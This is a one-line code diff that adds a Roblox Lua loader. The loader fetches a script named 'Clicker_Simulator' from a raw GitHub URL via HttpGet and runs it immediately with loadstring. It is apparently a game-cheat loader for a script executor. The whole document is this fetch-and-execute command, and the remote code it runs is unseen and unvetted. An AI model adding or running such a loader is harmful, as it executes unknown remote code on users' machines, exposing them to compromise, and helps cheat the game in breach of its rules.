@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Evzc/scripts/main/Clicker_Simulator", true))()
